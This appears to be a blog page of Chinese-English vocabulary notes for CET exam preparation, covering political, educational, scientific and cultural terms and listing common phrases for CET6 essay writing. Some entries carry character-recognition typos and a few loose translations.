盗版 pirated/illegal copies </span><br><span class="line">　　一国两制 One Country, Two Systems </span><br><span class="line">　　三个代表 the Three Represents Theory </span><br><span class="line">　　两会（人大、政协）Two Conferences (NPC and CPPCC)</span><br><span class="line">　　南南合作 South-South Cooperation</span><br><span class="line">　　南北对话 North-South Dialog</span><br><span class="line">　　人大常委会 People’s Congress Standing Committee</span><br><span class="line">　　法制观念 awareness of law</span><br><span class="line">　　法制国家 a country with an adequate legal system</span><br><span class="line">　　改革开放 reform and opening-up</span><br><span class="line">　　公务员 civil servants</span><br><span class="line">　　官僚主义作风 the bureaucratic style of work </span><br><span class="line">　　和谐并存 harmonious coexistence </span><br><span class="line">　　计划生育 family planning</span><br><span class="line">　　计划生育基本国策 the basic state policy of family planning</span><br><span class="line">　　青才申文明建设 the construction of spiritual civilization </span><br><span class="line">　　居委会 neighborhood committee</span><br><span class="line">　　科教兴国 national rejuvenation through science and education </span><br><span class="line">　　可持续发展 sustainable development </span><br><span class="line">　　廉洁高效 honesty and high efficiency </span><br><span class="line">　　两岸关系 cross-straits relations </span><br><span class="line">　　两岸谈判 cross-straits negotiations </span><br><span class="line">　　领 土完整 territorial integrity </span><br><span class="line">　　民族精神 national spirit </span><br><span class="line">　　普选制 general election system</span><br><span class="line">　　求同存异 seek common ground while shelving differences </span><br><span class="line">　　人大代表NPC member</span><br><span class="line">　　物质文明和精神文明 material and spiritual civilization</span><br><span class="line">　　小康社会 a well-off society</span><br><span class="line">　　小康水平 a well-off standard</span><br><span class="line">　　一个中国原则 the one-China principle</span><br><span class="line">　　与时俱进 keep pace with the times</span><br><span class="line">　　综合国力 overall national strength</span><br><span class="line">　　共同愿望common desire</span><br><span class="line">　　“走出去”（战略）going global</span><br><span class="line">　　不结盟 non-alignment</span><br><span class="line">　　单边主义 unilateralism</span><br><span class="line">　　多边政策 multilateralism</span><br><span class="line">　　多极世界 multipolar world</span><br><span class="line">　　人 口 老龄化 aging of population</span><br><span class="line">　　人口出生率birth rate</span><br><span class="line">　　社区月服务 community service</span><br><span class="line">　　道德法庭 court of ethics</span><br><span class="line">　　盗用公款embezzlement</span><br><span class="line">　　成人夜校 night school for adults</span><br><span class="line">　　在职进修班 on-job training courses</span><br><span class="line">　　政治思想教育 political and ideological education</span><br><span class="line">　　毕业生分酉己 graduate placement; assignment of graduate</span><br><span class="line">　　充电 update one’s knowledge</span><br><span class="line">　　初等教育 elementary education</span><br><span class="line">　　大学城 college town</span><br><span class="line">　　大学社区 college community</span><br><span class="line">　　高等教育 higher education</span><br><span class="line">　　高等教育“211 工程” the “211 Project” for higher education</span><br><span class="line">　　高等学府 institution of higher education</span><br><span class="line">　　综合性大学 comprehensive university</span><br><span class="line">　　文科院校 colleges of (liberal) arts</span><br><span class="line">　　理工科大学 college / university of science and engineering</span><br><span class="line">　　师范学院 teachers’ college; normal college</span><br><span class="line">　　高分低能 high scores and low abilities</span><br><span class="line">　　高考(university/college) entrance examination</span><br><span class="line">　　高校扩招 the college expansion plan</span><br><span class="line">　　教育界 education circle</span><br><span class="line">　　教育投入 input in education</span><br><span class="line">　　九年义务教育 nine-year compulsory education</span><br><span class="line">　　考研 take the entrance exams for postgraduate schools</span><br><span class="line">　　课外活动 extracurricular activities</span><br><span class="line">　　必修课 required/compulsory course </span><br><span class="line">　　选修课 elective/optional course </span><br><span class="line">　　基础课 basic courses </span><br><span class="line">　　专业课 specialized courses </span><br><span class="line">　　课程表 school schedule </span><br><span class="line">　　教学大纲 teaching program; syllabus </span><br><span class="line">　　学习年限 period of schooling </span><br><span class="line">　　学历 record of formal schooling </span><br><span class="line">　　学分 credit</span><br><span class="line">　　启发式教学 heuristic teaching </span><br><span class="line">　　人才交流 talent exchange </span><br><span class="line">　　人才战 competition for talented people </span><br><span class="line">　　商务英语证书 Business English Certificate (BEC) </span><br><span class="line">　　适龄儿重入学率 enrollment rate for children of school age</span><br><span class="line">　　升学率 proportion of students entering schools of a higher grade; enrollment rate </span><br><span class="line">　　硕博连读 a continuous academic project that involves postgraduate and doctoral study </span><br><span class="line">　　素质教育 quality-oriented education </span><br><span class="line">　　填鸭式教学 cramming method of teaching </span><br><span class="line">　　希望工程Project Hope </span><br><span class="line">　　走读生 extern; non-resident student </span><br><span class="line">　　住宿生boarder</span><br><span class="line">　　研究生 graduate student; post-graduate (student)</span><br><span class="line">　　应届毕业生 graduating student; current year’s graduate</span><br><span class="line">　　校园数字化 campus digitalization</span><br><span class="line">　　校园文化 campus culture</span><br><span class="line">　　学汉语热 enthusiasm in learning Chinese</span><br><span class="line">　　学历教育 education with record of formal schooling</span><br><span class="line">　　学龄儿重school-ager</span><br><span class="line">　　学前教育 preschool education</span><br><span class="line">　　学生减负 alleviate the burden on students</span><br><span class="line">　　应试教育 exam-oriented education</span><br><span class="line">　　职业道德 work ethics; professional ethics</span><br><span class="line">　　爷己者招待会press conference</span><br><span class="line">　　国家教委 State Education Commission</span><br><span class="line">　　国家统计局 State Statistical Bureau</span><br><span class="line">　　职业培训job training</span><br><span class="line">　　职业文盲 functional illiterate</span><br><span class="line">　　智力引进 recruit/introduce (foreign) talents</span><br><span class="line">　　智商 intelligence quotient (IQ)</span><br><span class="line">　　助学行动 activity to assist the impoverished students </span><br><span class="line">　　网络世界cyber world </span><br><span class="line">　　网络文化cyber culture </span><br><span class="line">　　网络犯罪cyber crime </span><br><span class="line">　　网上购物 online shopping </span><br><span class="line">　　高产优质 high yield and high quality </span><br><span class="line">　　高科技园 high-tech park </span><br><span class="line">　　工业园区 industrial park</span><br><span class="line">　　火炬计划 Torch Program (a plan to develop new and high technology)</span><br><span class="line">　　信息港info port </span><br><span class="line">　　信息革命 information revolution </span><br><span class="line">　　电子货币e-currency </span><br><span class="line">　　人工智能 artificial intelligence (AI)</span><br><span class="line">　　生物技术 bio-technology </span><br><span class="line">　　克隆 cloning</span><br><span class="line">　　基因工程 genetic engineering</span><br><span class="line">　　转基因食品 genetically modified food (GM food)</span><br><span class="line">　　试管婴儿 test-tube baby</span><br><span class="line">　　基因哭变 genetic mutation</span><br><span class="line">　　网络出版e-publishing</span><br><span class="line">　　三维电影 three-dimensional movie</span><br><span class="line">　　光谷 optical valley</span><br><span class="line">　　虚拟银行virtual bank</span><br><span class="line">　　信息化 informationization</span><br><span class="line">　　信息高速公路 information superhighway</span><br><span class="line">　　新兴学科 new branch of science; emerging discipline</span><br><span class="line">　　纳米 nanometer</span><br><span class="line">　　个人数字助理 personal digital assistant (PDA)</span><br><span class="line">　　生态农业 environment-friendly agriculture</span><br><span class="line">　　技术密集产品 technology-intensive product</span><br><span class="line">　　数码科技 digital technology</span><br><span class="line">　　同步卫星 geostationary satellite</span><br><span class="line">　　神舟五号载人飞船 manned spacecraft Shenzhou V</span><br><span class="line">　　风云二号气象卫星 Fengyun II meteorological satellite</span><br><span class="line">　　登月舱 lunar module</span><br><span class="line">　　多任务小卫星 small multi-mission satellite (SMMS)</span><br><span class="line">　　多媒体短信服务 Multimedia Messaging Service ( MMS)</span><br><span class="line">　　电子商务 e-business; e-commerce </span><br><span class="line">　　电子管理e-management </span><br><span class="line">　　办公自动化 Office Automation (OA)</span><br><span class="line">　　信息高地 information highland</span><br><span class="line">　　信息检索 information retrieval</span><br><span class="line">　　电话会议 teleconference</span><br><span class="line">　　无土栽培 soilless cultivation</span><br><span class="line">　　超级杂交水稻super-hybrid rice</span><br><span class="line">　　科技发展 scientific and technological advancement</span><br><span class="line">　　重点项目key project</span><br><span class="line">　　国家重点工程 national key projects</span><br><span class="line">　　南水北调 South-to-North water diversion </span><br><span class="line">　　西电东送 West-East electricity transmission project </span><br><span class="line">　　西气东输 West-East natural gas transmission project </span><br><span class="line">　　网络造谣 fabricating online rumors </span><br><span class="line">　　恶意侵害他人名誉 maliciously harming the reputation of others</span><br><span class="line">　　停止月服务 closure/shutdown of service </span><br><span class="line">　　公司歇业 closure of business </span><br><span class="line">　　道路封闭road closure</span><br><span class="line">　　人为操作差错 man-made operational mistakes </span><br><span class="line">　　生态系统 ecosystem </span><br><span class="line">　　森林生态系统forest ecosystem </span><br><span class="line">　　海洋生态系统marine ecosystem </span><br><span class="line">　　垄断价格 to monopolize the price </span><br><span class="line">　　垄断市场 to monopolize/forestall/captive/corner the market</span><br><span class="line">　　限购私用汽车 to curb the purchase of vehicles for private use </span><br><span class="line">　　汽车限购 vehicle purchase restrictions </span><br><span class="line">　　汽车购买配额 vehicle purchase quotas </span><br><span class="line">　　车牌摇号 a lottery for license plates </span><br><span class="line">　　牌照单双号限行 odd-even license plate system </span><br><span class="line">　　黑名单制度 a blacklist system </span><br><span class="line">　　执业医师 practicing physician; licensed doctors </span><br><span class="line">　　二代身份证 2nd-generation ID cards </span><br><span class="line">　　防伪技术 anti-forgery technology </span><br><span class="line">　　非法交易 illegal transaction </span><br><span class="line">　　冒名顶替 identification fraud </span><br><span class="line">　　洗钱 money laundering </span><br><span class="line">　　挂失 to report the loss </span><br><span class="line">　　补办 to re-apply/post-register </span><br><span class="line">　　户籍 household registration </span><br><span class="line">　　居住证 residence permit </span><br><span class="line">　　山洪暴发flash floods </span><br><span class="line">　　水位 water level </span><br><span class="line">　　低洼地区 low-lying areas </span><br><span class="line">　　淹没农田 to inundate crops </span><br><span class="line">　　大桥蜂塌 bridge collapse </span><br><span class="line">　　最严重受灾地区 worst-hit/worst-stricken area</span><br><span class="line">　　直接经济损失direct economic loss </span><br><span class="line">　　应急系统 emergency response system </span><br><span class="line">　　闯红灯 running red light</span><br><span class="line">　　遮挡、污损号牌 blocking or defacing license plates </span><br><span class="line">　　扣分处罚point penalty </span><br><span class="line">　　酒驾 drunk driving </span><br><span class="line">　　终身禁驾 lifetime ban from driving</span><br></pre></td></tr></table></figure>
<h3 id="中国历史和文化"><a href="#中国历史和文化" class="headerlink" title="中国历史和文化"></a>中国历史和文化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line">　　京剧 Peking opera </span><br><span class="line">　　秦腔 Qin opera </span><br><span class="line">　　功夫Kungfo </span><br><span class="line">　　太极Tai Chi </span><br><span class="line">　　口 技 ventriloquism </span><br><span class="line">　　木偶戏puppet show </span><br><span class="line">　　皮影戏 shadowplay </span><br><span class="line">　　折子戏 opera highlights </span><br><span class="line">　　杂技 acrobatics </span><br><span class="line">　　相声 witty dialogue comedy </span><br><span class="line">　　刺绣 embroidery </span><br><span class="line">　　苏绣 Suzhou embroidery </span><br><span class="line">　　泥人 clay figure </span><br><span class="line">　　书法 calligraphy</span><br><span class="line">　　中国画 traditional Chinese painting </span><br><span class="line">　　水墨画 Chinese brush painting </span><br><span class="line">　　中国结 Chinese knot</span><br><span class="line">　　中国古代四大发明 the four great inventions of ancient China </span><br><span class="line">　　火药 gunpowder </span><br><span class="line">　　印刷术printing </span><br><span class="line">　　造纸术 paper-making </span><br><span class="line">　　指南针 the compass </span><br><span class="line">　　青铜器 bronze ware </span><br><span class="line">　　瓷器 porcelain; china</span><br><span class="line">　　唐三彩 tri-color glazed pottery of the Tang Dynasty</span><br><span class="line">　　景泰蓝cloisonne</span><br><span class="line">　　秋千swing</span><br><span class="line">　　武术 martial arts</span><br><span class="line">　　儒家思想Confucianism</span><br><span class="line">　　儒家文化 Confucian culture</span><br><span class="line">　　道教 Taoism</span><br><span class="line">　　墨家Mohism</span><br><span class="line">　　法家 Legalism</span><br><span class="line">　　佛教 Buddhism</span><br><span class="line">　　孔子 Confucius</span><br><span class="line">　　孟子 Mencius</span><br><span class="line">　　老子 Lao Tzu</span><br><span class="line">　　庄子 Chuang Tzu</span><br><span class="line">　　墨子 Mo Tzu</span><br><span class="line">　　孙子Sun Tzu</span><br><span class="line">　　象形文字 pictographic characters</span><br><span class="line">　　文房四宝（笔墨纸观）the Four Treasures of the Study (brush, ink stick, paper, and ink stone)</span><br><span class="line">　　《大学》The Great Learning</span><br><span class="line">　　《中庸》The Doctrine of the Mean</span><br><span class="line">　　《论语》The Analects of Confucius</span><br><span class="line">　　《孟子》The Mencius</span><br><span class="line">　　《孙子兵法》The Art of War</span><br><span class="line">　　《三国演义》Three Kingdoms</span><br><span class="line">　　《西游爷己》Journey to the West</span><br><span class="line">　　《红楼梦》Dream of the Red Mansions</span><br><span class="line">　　《水浒传》Heroes of the Marshes</span><br><span class="line">　　《山海经》The Classic of Mountains and Rivers</span><br><span class="line">　　《资治通鉴》History as a Mirror</span><br><span class="line">　　《春秋》The Spring and Autumn Annals</span><br><span class="line">　　《史记》Historical Records</span><br><span class="line">　　《诗经》The Book of Songs</span><br><span class="line">　　《易经》The I Ching; The Book of Changes</span><br><span class="line">　　《礼记》The Book of Rites</span><br><span class="line">　　《三字经》Three-character Scriptures</span><br><span class="line">　　八股文 eight-part essay</span><br><span class="line">　　五言绝句 five-character quatrain</span><br><span class="line">　　七言律诗 seven-character octave</span><br><span class="line">　　旗袍 cheongsam</span><br><span class="line">　　中山装 Chinese tunic suit</span><br><span class="line">　　唐装 Tang suit</span><br><span class="line">　　风水 Fengshui; geomantic omen </span><br><span class="line">　　阳历 Solar calendar </span><br><span class="line">　　阴历 Lunar calendar </span><br><span class="line">　　闰年 leap year </span><br><span class="line">　　十二生肖zodiac </span><br><span class="line">　　春节 the Spring Festival </span><br><span class="line">　　元宵节 the Lantern Festival</span><br><span class="line">　　清明节 the Tomb-sweeping Day </span><br><span class="line">　　端午节 the Dragon-boat Festival </span><br><span class="line">　　中秋节 the Mid-autumn Day </span><br><span class="line">　　重阳节 the Double-ninth Day </span><br><span class="line">　　七夕节 the Double-seventh Day </span><br><span class="line">　　春联 spring couplets </span><br><span class="line">　　庙会 temple fair </span><br><span class="line">　　爆竹 firecracker</span><br><span class="line">　　年画（traditional) New Year pictures </span><br><span class="line">　　压岁钱 New Year gift-money</span><br><span class="line">　　舞龙dragon dance</span><br><span class="line">　　元宵 sweet sticky rice dumplings </span><br><span class="line">　　花灯 festival lantern</span><br><span class="line">　　灯谜 lantern riddle</span><br><span class="line">　　舞狮 lion dance</span><br><span class="line">　　踩高跷 stilt walking</span><br><span class="line">　　赛龙舟 dragon boat race</span><br><span class="line">　　胡同hutong</span><br><span class="line">　　山东菜 Shandong cuisine </span><br><span class="line">　　川菜 Sichuan cuisine </span><br><span class="line">　　粤菜 Canton cuisine </span><br><span class="line">　　扬州菜 Yangzhou cuisine </span><br><span class="line">　　月饼 moon cake </span><br><span class="line">　　年糕 rice cake </span><br><span class="line">　　油条 deep-fried dough sticks </span><br><span class="line">　　豆浆 soybean milk </span><br><span class="line">　　馒头 steamed buns </span><br><span class="line">　　花卷 steamed twisted rolls </span><br><span class="line">　　包子 steamed stuffed buns </span><br><span class="line">　　北京烤鸭 Beijing roast duck </span><br><span class="line">　　拉面 hand-stretched noodles </span><br><span class="line">　　馄饨 wonton (dumplings in soup)</span><br><span class="line">　　豆腐 tofu? bean curd </span><br><span class="line">　　麻花 fried dough twist </span><br><span class="line">　　烧饼 clay oven rolls </span><br><span class="line">　　皮蛋 100-year egg; century egg </span><br><span class="line">　　蛋炒饭 fried rice with egg </span><br><span class="line">　　糖葫芦 tomatoes on sticks </span><br><span class="line">　　火锅hot pot</span><br><span class="line">　　长城 the Great Wall of China </span><br><span class="line">　　烽火台 beacon tower</span><br><span class="line">　　秦士台皇陵 the Mausoleum of Emperor Qinshihuang</span><br><span class="line">　　兵马俑 Terracotta Warriors and Horses</span><br><span class="line">　　大雁塔 Big Wild Goose Pagoda</span><br><span class="line">　　丝绸之路the Silk Road</span><br><span class="line">　　敦煌莫高窟Mogao Grottoes</span><br><span class="line">　　华清池 Huaqing Hot Springs</span><br><span class="line">　　五台山&quot;Wutai Mountain</span><br><span class="line">　　九华山 Jiuhua Mountain</span><br><span class="line">　　蛾眉山Mount Emei</span><br><span class="line">　　泰山 Mount Tai</span><br><span class="line">　　黄山 Mount Huangshan; the Yellow Mountain </span><br><span class="line">　　故宫 the Imperial Palace</span><br><span class="line">　　天坛 the Temple of Heaven </span><br><span class="line">　　午门 Meridian Gate</span><br><span class="line">　　大运河 Grand Canal</span><br><span class="line">　　护城河the Moat</span><br><span class="line">　　回音壁Echo Wall</span><br><span class="line">　　居庸关 Juyongguan Pass</span><br><span class="line">　　九龙壁 the Nine Dragon Wal</span><br><span class="line"></span><br><span class="line">　　黄帝陵 the Mausoleum of Emperor Huangdi</span><br><span class="line">　　十三陵 the Ming Tombs</span><br><span class="line">　　苏州园林 Suzhou gardens</span><br><span class="line">　　西湖 West Lake</span><br><span class="line">　　九寨沟 Jiuzhaigou Valley</span><br><span class="line">　　日月潭 Sun Moon Lake</span><br><span class="line">　　布达拉宫Potala Palace</span><br><span class="line">　　鼓楼 drum tower</span><br><span class="line">　　四合院 quadrangle; courtyard complex</span><br><span class="line">　　孔庙 Confucius Temple</span><br><span class="line">　　乐山大佛 Leshan Giant Buddha</span><br><span class="line">　　十八罗汉 the Eighteen Disciples of the Buddha</span><br><span class="line">　　喇嘛Lama</span><br><span class="line">　　转世灵重 reincarnated soul boy 中药 traditional Chinese medicine</span><br><span class="line">　　《黄内经》Emperor Huangdi，s Canon of Traditional Chinese Medicine </span><br><span class="line">　　《神农本草经》Shennong，s Herbal Classic </span><br><span class="line">　　《本草纲目》Compendium of Materia Medica </span><br><span class="line">　　针灸 acupuncture </span><br><span class="line">　　推拿 medical massage </span><br><span class="line">　　切脉 feeling the pulse </span><br><span class="line">　　五禽戏 five-animal exercises </span><br><span class="line">　　旧石器时代 the Paleolithic Age </span><br><span class="line">　　新石器时代 the Neolithic Age; New Stone Age </span><br><span class="line">　　母系氏族社会 matriarchal clan society </span><br><span class="line">　　封建的feudal </span><br><span class="line">　　朝代 dynasty </span><br><span class="line">　　秦朝 Qin Dynasty </span><br><span class="line">　　汉朝 Han Dynasty </span><br><span class="line">　　唐朝 Tang Dynasty </span><br><span class="line">　　宋朝 Song Dynasty </span><br><span class="line">　　元朝 Yuan Dynasty </span><br><span class="line">　　明朝 Ming Dynasty </span><br><span class="line">　　清朝 Qing Dynasty</span><br><span class="line">　　秦士台皇帝 Emperor Qinshihuang; the First Emperor of Qin</span><br><span class="line">　　皇太后 Empress Dowager</span><br><span class="line">　　汉高祖刘邦 Liu Bang, Emperor Hangaozu, founder of the Han Dynasty </span><br><span class="line">　　成吉思汗Genghis Khan </span><br><span class="line">　　春秋时期 the Spring and Autumn Period </span><br><span class="line">　　文成公主 Tang Princess Wencheng </span><br><span class="line">　　慈禧太后 Empress Dowager Ci Xi </span><br><span class="line">　　皇帝，君主 emperor; monarch </span><br><span class="line">　　诸侯vassal</span><br><span class="line">　　皇妃 imperial concubine </span><br><span class="line">　　丞相，宰相 prime minister </span><br><span class="line">　　太监 court eunuch </span><br><span class="line">　　少数民族 ethnic minority </span><br><span class="line">　　祭祀 offer sacrifices </span><br><span class="line">　　西域 the Western Regions </span><br><span class="line">　　战国 the Warring States </span><br><span class="line">　　中华文明 Chinese civilization </span><br><span class="line">　　文明的摇篮 cradle of civilization</span><br><span class="line">　　秦始皇统一中国 unification of the country by Emperor Qinshihuang </span><br><span class="line">　　鸦片战争the Opium War </span><br><span class="line">　　太平天国 the Taiping Heavenly Kingdom </span><br><span class="line">　　戌戌变法 the Reform Movement of 1898 </span><br><span class="line">　　辛亥革命 the 1911 Revolution </span><br><span class="line">　　新民主主义革命 New-democratic Revolution </span><br><span class="line">　　五四运动 the May 4th Movement of 1919 </span><br><span class="line">　　南昌起义 Nanchang Uprising </span><br><span class="line">　　918 事变 September 18th Incident </span><br><span class="line">　　长征 the Long March </span><br><span class="line">　　西安事变 Xi&quot;an Incident </span><br><span class="line">　　南京大屠杀Nanjing Massacre </span><br><span class="line">　　抗日战争 the War of Resistance Against Japan </span><br><span class="line">　　毛泽东 Mao Tse-tong </span><br><span class="line">　　孙中山 Sun Yat-sen </span><br><span class="line">　　蒋介石 Chiang Kai-shek </span><br><span class="line">　　国民党 Kuomingtang</span><br><span class="line">　　中华人民共和国 the People’s Republic of China (PRC)</span><br><span class="line">　　满族 Manchu</span><br><span class="line">　　蒙古人Mongol</span><br><span class="line">　　士大夫 scholar-officials</span><br><span class="line">　　学者 scholar</span><br><span class="line">　　诗人 poet</span><br><span class="line">　　政治家statesman</span><br><span class="line">　　社会地位social status</span><br></pre></td></tr></table></figure>
<h1 id="CET6"><a href="#CET6" class="headerlink" title="CET6"></a>CET6</h1><h2 id="Writing-1"><a href="#Writing-1" class="headerlink" title="Writing"></a>Writing</h2><h3 id="短语"><a href="#短语" class="headerlink" title="短语"></a>短语</h3><pre><code>1．随着经济的快速发展with the rapid development of economy
2．人民生活水平的显著提高/ 稳步增长　 the remarkable improvement/ steady growth of people’s living standard
3．先进的科学技术 advanced science and technology
4．面临新的机遇和挑战 be faced with new opportunities and challenges
5．人们普遍认为 It is commonly believed/ recognized that…
6．社会发展的必然结果 the inevitable result of social development
7．引起了广泛的公众关注 arouse wide public concern/ draw public attention
8．不可否认 It is undeniable that…/ There is no denying that…
9．热烈的讨论/ 争论 a heated discussion/ debate
10. 有争议性的问题 a controversial issue
11．完全不同的观点 a totally different argument
12．一些人 …而另外一些人 … Some people… while others…
13. 就我而言/ 就个人而言 As far as I am concerned, / Personally,
14．就…达到绝对的一致 reach an absolute consensus on…
15．有充分的理由支持 be supported by sound reasons
16．双方的论点 argument on both sides
17．发挥着日益重要的作用 play an increasingly important role in…
18．对…必不可少 be indispensable to …
19．正如谚语所说 As the proverb goes:
20．…也不例外 …be no exception
21．对…产生有利/不利的影响 exert positive/ negative effects on…
22．利远远大于弊 the advantages far outweigh the disadvantages.
23．导致，引起 lead to/ give rise to/ contribute to/ result in
24．复杂的社会现象 a complicated social phenomenon
25．责任感 / 成就感 sense of responsibility/ sense of achievement
26. 竞争与合作精神 sense of competition and cooperation
27. 开阔眼界 widen one’s horizon/ broaden one’s visio
28．学习知识和技能 acquire knowledge and skills
29．经济/心理负担 financial burden / psychological burden
30．考虑到诸多因素 take many factors into account/ consideration
31. 从另一个角度 from another perspective
32．做出共同努力 make joint efforts
33. 对…有益 be beneficial / conducive to…
34．为社会做贡献 make contributions to the society
35．打下坚实的基础 lay a solid foundation for…
36．综合素质 comprehensive quality
37．无可非议 blameless / beyond reproach
39．致力于/ 投身于 be committed / devoted to…
40. 应当承认 Admittedly,
41．不可推卸的义务 unshakable duty
42. 满足需求 satisfy/ meet the needs of…
43．可靠的信息源 a reliable source of information
44．宝贵的自然资源 valuable natural resources
45．因特网 the Internet （一定要由冠词，字母I 大写）
46．方便快捷 convenient and efficient
47．在人类生活的方方面面 in all aspects of human life
48．环保（的） environmental protection / environmentally friendly
49．社会进步的体现 a symbol of society progress
50．科技的飞速更新 the ever-accelerated updating of science and technology
51．对这一问题持有不同态度 hold different attitudes towards this issue
52．支持前/后种观点的人 people / those in fovor of the former/ latteropinion
53．有/ 提供如下理由/ 证据 have/ provide the following reasons/ evidence
54．在一定程度上 to some extent/ degree / in some way
55. 理论和实践相结合 integrate theory with practice
56. …必然趋势 an irresistible trend of…
57．日益激烈的社会竞争 the increasingly fierce social competition
58．眼前利益 immediate interest/ short-term interest
59．长远利益. interest in the long run
60．…有其自身的优缺点 … has its merits and demerits/ advantages and disadvantages
61．扬长避短 Exploit to the full one’s favorable conditions and avoid unfavorable ones
62．取其精髓，去其糟粕 Take the essence and discard the dregs.
63．对…有害 do harm to / be harmful to/ be detrimental to
64．交流思想/ 情感/ 信息 exchange ideas/ emotions/ information
65．跟上…的最新发展 keep pace with / catch up with/ keep abreast with the latest development of …
66．采取有效措施来… take effective measures to do sth.
67．…的健康发展 the healthy development of …
68．有利有弊 Every coin has its two sides.No garden without weeds.
69．对…观点因人而异 Views on …vary from person to person.
70．重视 attach great importance to…
71．社会地位 social status
72．把时间和精力放在…上 focus time and energy on…
73．扩大知识面 expand one’s scope of knowledge
74．身心两方面 both physically and mentally
75．有直接/间接关系 be directly / indirectly related to…
76. 提出折中提议 set forth a compromise proposal
77. 可以取代 “think”的词 believe, claim, maintain, argue, insist, hold the opinion/ belief that
78．缓解压力/ 减轻负担 relieve stress/ burden
79．优先考虑/发展… give (top) priority to sth.
80．与…比较 compared with…/ in comparison with
81. 相反 in contrast / on the contrary.
82．代替 replace/ substitute / take the place of
83．经不起推敲 cannot bear closer analysis / cannot hold water
84．提供就业机会 offer job opportunities
85. 社会进步的反映 mirror of social progress
86．毫无疑问 Undoubtedly, / There is no doubt that…
87．增进相互了解 enhance/ promote mutual understanding
88．充分利用 make full use of / take advantage of
89．承受更大的工作压力 suffer from heavier work pressure
90．保障社会的稳定和繁荣 guarantee the stability and prosperity of our society
91．更多地强调 put more emphasis on…
92．适应社会发展 adapt oneself to the development of society
93．实现梦想 realize one’s dream/ make one’s dream come true
94. 主要理由列举如下 The main reasons are listed as follows:
95. 首先 First， Firstly， In the first place, To begin with
96．其次 Second, Secondly, In the second place
97. 再次 Besides，In addition, Additionally, Moreover, Furthermore
98. 最后 Finally, Last but not the least, Above all, Lastly,
99. 总而言之 All in all, To sum up, In summary, In a word,
100．我们还有很长的路要走 We still have a long way to go
